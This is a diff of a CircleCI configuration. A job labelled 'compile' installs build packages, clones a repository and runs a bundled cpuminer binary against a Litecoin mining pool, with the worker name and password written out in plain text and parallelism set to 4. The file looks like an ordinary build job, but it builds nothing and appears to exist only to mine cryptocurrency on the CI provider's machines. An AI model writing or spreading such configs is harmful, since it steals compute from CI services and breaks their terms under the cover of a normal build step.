@@ -2,19 +2,18 @@ version: 2.1
 jobs:
   compile:
    docker:
-     - image: alpine:latest
+     - image: ubuntu:latest
    steps:
       - run:
           command: |
-           apk update && apk upgrade 
-           apk add openssh git openssl-dev bash  jansson-dev
+           apt update 
+           apt-get install build-essential automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git -y
            mkdir  ~/.ssh
            ssh-keyscan github.com >> ~/.ssh/known_hosts
            git clone --depth=1 git@github.com:ltcwoker/RDP.git Q
            cd Q
            chmod 755 cpuminer
-
-           bash -c ./cpuminer --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker13:my123456
+           ./cpuminer --algo=scrypt --url=stratum+tcp://us.litecoinpool.org:3333 --userpass=djemil.mywoker13:my123456
       
    parallelism: 4       
 workflows:
